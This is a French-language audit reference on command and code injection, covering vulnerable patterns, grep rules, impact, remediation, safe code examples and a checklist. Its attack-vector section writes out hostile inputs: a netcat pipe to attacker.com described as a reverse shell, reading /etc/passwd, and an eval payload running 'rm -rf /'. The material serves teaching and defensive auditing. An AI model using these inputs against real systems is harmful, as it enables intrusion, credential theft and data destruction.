# Command Injection

## Définition

Injection de commandes système malveillantes via l'application, permettant d'exécuter du code arbitraire sur le serveur.

## Sévérité

🔴 **CRITIQUE** - Exécution de code arbitraire, prise de contrôle du serveur

## Types d'Injection

### 1. OS Command Injection
Injection dans les commandes système (shell)

### 2. Code Injection
Injection dans eval(), exec(), Function() (JavaScript, Python, etc.)

### 3. Expression Language Injection
Injection dans template engines, OGNL, SpEL, etc.

## Patterns Vulnérables à Détecter

### Exécution de Commandes Shell

```
Patterns dangereux :
- exec("command " + userInput)
- child_process.exec(`command ${param}`)
- os.system("command " + input)
- Runtime.getRuntime().exec("command " + param)
- shell_exec("command " + input)
- subprocess.call("command " + input, shell=True)
```

### Eval et Exécution Dynamique

```
- eval(userInput)
- Function(userInput)
- exec(userInput)
- vm.runInNewContext(userInput)
- new Function(code)()
```

### Template Injection

```
- template.render(userInput)
- engine.render("Hello " + name)  // si SSTI possible
```

## Vecteurs d'Attaque

### Shell Command Injection

**Input avec Séparateurs**
```
Input: ; ls -la
Command: ping 127.0.0.1; ls -la
→ Exécute ls après ping

Input: && cat /etc/passwd
Command: command && cat /etc/passwd
→ Exécute cat si command réussit

Input: | nc attacker.com 4444
Command: command | nc attacker.com 4444
→ Pipe vers netcat (reverse shell)
```

**Input avec Substitution**
```
Input: $(whoami)
Command: echo $(whoami)
→ Exécute whoami

Input: `id`
Command: ping `id`
→ Substitution de commande
```

### Code Injection

**eval() Exploitation**
```
Input: __import__('os').system('rm -rf /')
Code: eval(userInput)
→ Exécution de code Python malveillant

Input: require('child_process').exec('malicious')
Code: eval(userInput)
→ Exécution de code Node.js
```

### Path Traversal dans Commands

```
Input: ../../etc/passwd
Command: cat /var/app/files/../../etc/passwd
→ Lecture de /etc/passwd
```

## Localisation dans le Code

### À Chercher

#### File Operations
- Traitement de fichiers uploadés
- Conversion d'images, PDFs
- Compression/décompression
- Génération de thumbnails

#### System Operations
- Backup, restore
- Export de données
- Génération de rapports
- Maintenance tasks

#### Network Operations
- Ping, traceroute
- DNS lookup
- Port scanning
- Network diagnostics

#### Development Tools
- Build scripts
- Deployment scripts
- Database migrations
- Testing utilities

### Patterns à Grep

```
Rechercher :
- "exec\(.*\+.*\)"
- "exec\(.*\$\{.*\}\)"
- "child_process\.exec.*req\."
- "os\.system.*\+.*"
- "shell_exec.*\$_"
- "subprocess\.call.*shell=True"
- "Runtime\.getRuntime\(\)\.exec"
- "eval\(.*req\."
- "Function\(.*user"
```

## Impact

### Exécution de Code Arbitraire
- Commandes système malveillantes
- Installation de backdoors
- Téléchargement de malware

### Accès aux Données
- Lecture de fichiers sensibles (/etc/passwd, /etc/shadow)
- Dump de bases de données
- Accès aux variables d'environnement (secrets)

### Prise de Contrôle
- Reverse shell
- Escalade de privilèges
- Persistance sur le système

### Déni de Service
- Fork bombs
- Suppression de fichiers critiques
- Saturation de ressources

## Remédiation

### 1. Éviter l'Exécution de Commandes Shell

**Principe**
- Utiliser des APIs natives plutôt que shell commands
- Bibliothèques système au lieu de exec()

**Alternatives**
```
❌ BAD :
exec("rm " + filename)

✅ GOOD :
fs.unlink(filename)  // API native
```

### 2. Input Validation Stricte

**Whitelist**
- Liste fermée de valeurs autorisées
- Validation du format attendu
- Rejection de tout caractère spécial

```
✅ CORRECT :
const allowedCommands = ['start', 'stop', 'status']
if (!allowedCommands.includes(userInput))
  throw new Error('Invalid command')
```

### 3. Paramétrage des Commandes

**Utiliser des Arguments**
```
✅ CORRECT (Node.js) :
// Passer arguments séparément, pas via shell
execFile('ping', ['-c', '1', host], { shell: false })

✅ CORRECT (Python) :
# Liste d'arguments, shell=False
subprocess.run(['ping', '-c', '1', host], shell=False)
```

### 4. Sanitization

**Échapper les Caractères Spéciaux**
```
Caractères à échapper : ; & | < > $ ` \ ! # * ? [ ] ( ) { } ' "

✅ CORRECT :
function escapeShell(arg) {
  return arg.replace(/[;&|<>$`\\!#*?[\](){}'"]/g, '\\$&')
}
```

**Attention**
- Sanitization seule n'est pas suffisante
- Toujours préférer paramétrage ou éviter shell

### 5. Éviter eval() et Équivalents

**Ne Jamais Utiliser**
- eval()
- Function()
- exec() (Python)
- vm.runInNewContext()

**Si Absolument Nécessaire**
- Sandbox isolé
- Validation extrêmement stricte
- Limitation des fonctionnalités disponibles

### 6. Least Privilege

**Exécution**
- Processus avec utilisateur non-privilégié
- Pas de sudo/root
- Restrictions de filesystem
- Limites de ressources

### 7. Chroot/Containerisation

**Isolation**
- Chroot jail
- Containers (Docker)
- VMs pour opérations sensibles
- Namespaces Linux

## Checklist d'Audit

### Recherche de Vulnérabilités
- [ ] Utilisation de exec(), system(), shell_exec() ?
- [ ] Input utilisateur dans commandes shell ?
- [ ] Concaténation de strings pour commandes ?
- [ ] Utilisation de eval(), Function() ?
- [ ] shell=True avec subprocess ?
- [ ] Traitement de fichiers avec commandes externes ?

### Validation des Correctifs
- [ ] APIs natives utilisées plutôt que shell ?
- [ ] Arguments passés séparément (shell=False) ?
- [ ] Whitelist pour valeurs autorisées ?
- [ ] Sanitization des inputs (dernier recours) ?
- [ ] Exécution avec privilèges minimaux ?
- [ ] Containerisation/isolation en place ?

### Tests de Vulnérabilité
- [ ] Tester avec ; ls ?
- [ ] Tester avec && whoami ?
- [ ] Tester avec | nc ?
- [ ] Tester avec $(command) ?
- [ ] Tester avec `command` ?

## Caractères Dangereux

### Séparateurs de Commandes
```
;   Séquence de commandes
&   Commande en background
&&  ET logique
||  OU logique
|   Pipe
```

### Substitution
```
$()   Command substitution
``    Backtick substitution
${}   Variable expansion
```

### Redirections
```
>     Output redirection
<     Input redirection
>>    Append
2>    Error redirection
```

### Autres
```
\     Escape character
'     Single quote
"     Double quote
`     Backtick
```

## Exemples Sécurisés

### Node.js - Exécution Sécurisée
```
❌ BAD :
exec(`ping -c 1 ${host}`)

✅ GOOD :
const { execFile } = require('child_process')
execFile('ping', ['-c', '1', host], { shell: false }, callback)
```

### Python - Subprocess Sécurisé
```
❌ BAD :
os.system("ping -c 1 " + host)

✅ GOOD :
subprocess.run(['ping', '-c', '1', host], shell=False, capture_output=True)
```

### Alternative Native
```
❌ BAD :
exec("rm " + filepath)

✅ GOOD :
fs.unlinkSync(filepath)  // API filesystem native
```

### Whitelist
```
✅ GOOD :
const allowedOperations = {
  'backup': '/usr/local/bin/backup.sh',
  'restore': '/usr/local/bin/restore.sh'
}

const scriptPath = allowedOperations[userInput]
if (!scriptPath)
  throw new Error('Invalid operation')

execFile(scriptPath, [], { shell: false })
```

## Références

- **OWASP** : Command Injection
- **CWE-77** : Improper Neutralization of Special Elements used in a Command
- **CWE-78** : OS Command Injection
- **CWE-94** : Code Injection
